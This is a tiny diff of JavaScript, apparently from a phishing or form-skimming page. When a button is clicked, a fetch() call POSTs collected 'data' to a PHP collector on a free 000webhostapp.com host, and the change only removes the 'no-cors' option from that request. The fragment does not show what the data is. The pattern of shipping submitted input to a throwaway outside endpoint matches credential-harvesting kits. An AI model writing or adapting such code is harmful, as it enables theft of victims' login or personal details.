@@ -13,7 +13,6 @@ if (btn){
 
 
         const response = fetch("https://fckyou-get.000webhostapp.com/get.php", {
-            mode: 'no-cors',
             method: "POST",
             body: data
         });
